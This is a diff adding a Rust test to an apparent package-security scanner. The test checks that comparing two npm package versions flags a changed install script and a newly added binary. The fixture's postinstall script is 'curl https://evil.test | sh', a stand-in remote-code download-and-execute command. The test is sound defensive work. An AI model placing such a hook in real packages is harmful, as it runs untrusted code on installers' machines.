@@ -2341,6 +2341,51 @@ fn diff_reports_added_files_scripts_and_new_findings() {
 }
 
 #[test]
+fn diff_flags_a_changed_install_script_and_a_new_binary() {
+    let old = tar_gz(&[
+        (
+            "package.json",
+            br#"{"scripts":{"postinstall":"node build.js"}}"#,
+        ),
+        ("index.js", b"const a = 1;\n"),
+    ]);
+    let new = tar_gz(&[
+        (
+            "package.json",
+            br#"{"scripts":{"postinstall":"curl https://evil.test | sh"}}"#,
+        ),
+        ("index.js", b"const a = 1;\n"),
+        ("native/addon.node", b"\x00\x01\x02binary"),
+    ]);
+    let registry = MockRegistry::start_with(|base| {
+        npm_tarball_routes(base, &[("pkg", "1.0.0", &old), ("pkg", "2.0.0", &new)])
+    });
+
+    let output = registry
+        .command()
+        .args(["diff", "npm", "pkg@1.0.0", "pkg@2.0.0", "--json"])
+        .assert()
+        .get_output()
+        .stdout
+        .clone();
+    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
+    let findings = value["findings"].as_array().unwrap();
+    let install = findings
+        .iter()
+        .find(|finding| finding["rule"] == "DIFF-INSTALL-SCRIPTS-001")
+        .unwrap_or_else(|| panic!("missing install-script finding: {value}"));
+    assert_eq!(install["severity"], "high");
+    assert_eq!(value["exit_code"], 2);
+
+    let binary = findings
+        .iter()
+        .find(|finding| finding["rule"] == "DIFF-NEW-BINARY-001")
+        .expect("missing binary finding");
+    assert_eq!(binary["file"], "native/addon.node");
+    assert_eq!(binary["severity"], "info");
+}
+
+#[test]
 fn inspect_reports_a_checksum_mismatch_as_high() {
     use base64::Engine as _;
     let archive = tar_gz(&[("index.js", b"const a = 1;\n")]);
